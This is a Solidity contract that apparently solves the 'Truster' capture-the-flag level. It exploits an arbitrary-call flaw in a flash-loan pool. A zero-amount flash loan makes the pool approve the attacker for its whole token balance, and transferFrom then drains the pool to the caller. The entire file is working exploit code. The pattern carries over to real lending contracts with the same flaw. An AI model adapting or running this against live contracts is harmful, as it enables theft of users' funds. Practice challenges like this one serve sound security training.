pragma solidity ^0.8.0;

import '../truster/TrusterLenderPool.sol';

contract TrusterAttack {

    function attack(address pool, address token) public {
        uint bal = IERC20(token).balanceOf(pool);

        bytes memory data = abi.encodeWithSignature(
            'approve(address,uint256)', address(this), bal);

        // pool will call approve for its total balance
        TrusterLenderPool(pool).flashLoan(0, address(this), token, data);

        IERC20(token).transferFrom(pool, msg.sender, bal);
    }

}
